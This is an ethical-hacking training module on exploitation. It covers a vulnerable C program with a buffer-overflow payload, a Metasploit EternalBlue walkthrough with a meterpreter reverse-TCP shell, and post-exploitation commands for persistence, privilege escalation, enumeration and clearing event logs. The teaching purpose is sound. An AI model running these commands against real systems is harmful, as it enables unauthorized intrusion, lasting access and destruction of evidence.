# Module 4: Exploitation Techniques

Exploitation is the phase where an attacker leverages identified vulnerabilities to gain unauthorized access to a system. This module will cover the key aspects of exploit development, practical exploitation using the Metasploit Framework, and post-exploitation techniques for maintaining access and covering tracks.

## 1. Exploit Development

### Overview

Exploit development involves understanding how software vulnerabilities are discovered and how exploits are crafted to take advantage of these vulnerabilities. This process requires a deep understanding of system internals, programming, and reverse engineering.

### Steps in Exploit Development

#### 1.1 Vulnerability Research

The first step is to identify a vulnerability in the target system. This can be done through:
- **Manual Code Review:** Analyzing the source code for security flaws.
- **Fuzzing:** Automated testing with random or semi-random data to find crashes or unexpected behaviors.
- **Reverse Engineering:** Disassembling and analyzing binaries to understand their functionality and identify weaknesses.

#### 1.2 Proof of Concept (PoC)

Once a vulnerability is identified, a Proof of Concept exploit is created to demonstrate its viability. This often involves:
- **Understanding the Vulnerability:** Detailed analysis of how the vulnerability can be triggered.
- **Crafting Payloads:** Creating malicious input that exploits the vulnerability.
- **Testing:** Running the exploit in a controlled environment to verify its effectiveness.

#### 1.3 Developing a Full Exploit

After the PoC is verified, a full exploit is developed. This includes:
- **Payload Development:** Crafting payloads that execute specific actions, such as spawning a shell or executing code.
- **Exploit Code:** Writing the code that triggers the vulnerability and delivers the payload.
- **Testing and Refinement:** Iteratively testing and refining the exploit to ensure reliability and stealth.

### Tools for Exploit Development

- **GDB (GNU Debugger):** A debugger for analyzing and manipulating running programs.
- **Radare2:** An open-source reverse engineering framework.
- **pwntools:** A CTF (Capture The Flag) framework and exploit development library.

#### Example: Buffer Overflow Exploit

1. **Identify the Vulnerability:**
   ```c
   // vulnerable.c
   #include <stdio.h>
   #include <string.h>

   void vulnerable_function(char *str) {
       char buffer[64];
       strcpy(buffer, str);  // No bounds checking
   }

   int main(int argc, char **argv) {
       vulnerable_function(argv[1]);
       printf("Done\n");
       return 0;
   }
   ```

2. **Compile with Debugging Information:**
   ```bash
   gcc -o vulnerable vulnerable.c -g -fno-stack-protector -z execstack
   ```

3. **Create a Malicious Input:**
   ```bash
   python -c 'print "A" * 80' > payload
   ./vulnerable $(cat payload)
   ```

4. **Analyze the Crash with GDB:**
   ```bash
   gdb ./vulnerable
   run $(cat payload)
   ```

## 2. Using Metasploit Framework

### Overview

The Metasploit Framework is a powerful tool for developing and executing exploits. It includes a vast library of exploits, payloads, and auxiliary modules.

### Key Components

- **Exploits:** Code that takes advantage of vulnerabilities.
- **Payloads:** Code executed by exploits, such as shellcode.
- **Auxiliary Modules:** Tools for scanning, fuzzing, and more.
- **Post-Exploitation Modules:** Tools for maintaining access and gathering information.

### Practical Exploitation with Metasploit

#### Starting Metasploit

```bash
msfconsole
```

#### Basic Workflow

1. **Search for Exploits:**
   ```bash
   search type:exploit name:windows
   ```

2. **Select an Exploit:**
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue
   ```

3. **Set Target Options:**
   ```bash
   set RHOSTS 192.168.1.100
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST 192.168.1.10
   ```

4. **Run the Exploit:**
   ```bash
   exploit
   ```

5. **Interact with the Session:**
   ```bash
   sessions -i 1
   ```

### Example: Exploiting a Vulnerability

#### Using EternalBlue (MS17-010) Exploit

1. **Search for the Exploit:**
   ```bash
   msfconsole
   search ms17_010
   ```

2. **Select the Exploit:**
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue
   ```

3. **Configure the Exploit:**
   ```bash
   set RHOSTS 192.168.1.100
   set LHOST 192.168.1.10
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   ```

4. **Run the Exploit:**
   ```bash
   exploit
   ```

5. **Interact with the Meterpreter Session:**
   ```bash
   sessions -i 1
   ```

## 3. Post-Exploitation

### Overview

Post-exploitation involves activities carried out after gaining access to a system. The goals include maintaining access, gathering further information, and covering tracks to avoid detection.

### Key Activities

#### 3.1 Maintaining Access

- **Persistence:** Installing backdoors or creating new user accounts to ensure continued access.
- **Payloads:** Using Metasploit payloads like `persistence` to maintain access.

```bash
meterpreter > run persistence -U -i 5 -p 4444 -r 192.168.1.10
```

#### 3.2 Privilege Escalation

- **Exploit Privileges:** Exploiting vulnerabilities to gain higher privileges.
- **Tools:** Using tools like `post/windows/escalate/getsystem`.

```bash
meterpreter > getsystem
```

#### 3.3 Data Exfiltration

- **Gathering Data:** Collecting sensitive data, such as passwords, documents, and network information.
- **Tools:** Using modules like `post/windows/gather/enum_logged_on_users`.

```bash
meterpreter > run post/windows/gather/enum_logged_on_users
```

#### 3.4 Covering Tracks

- **Clearing Logs:** Deleting or tampering with log files to remove evidence of the intrusion.
- **Tools:** Using modules like `meterpreter > clearev`.

```bash
meterpreter > clearev
```

### Example: Maintaining Access

1. **Enable Persistence:**
   ```bash
   meterpreter > run persistence -U -i 5 -p 4444 -r 192.168.1.10
   ```

2. **Escalate Privileges:**
   ```bash
   meterpreter > getsystem
   ```

3. **Collect Data:**
   ```bash
   meterpreter > run post/windows/gather/enum_logged_on_users
   ```

4. **Clear Event Logs:**
   ```bash
   meterpreter > clearev
   ```

## Conclusion

Exploitation techniques are critical in ethical hacking to understand and demonstrate the impact of vulnerabilities. This module covered the essentials of exploit development, practical exploitation using the Metasploit Framework, and post-exploitation techniques. By mastering these techniques, ethical hackers can effectively assess and secure systems against potential attacks. Always ensure that you have proper authorization before performing any exploit or post-exploitation activities.
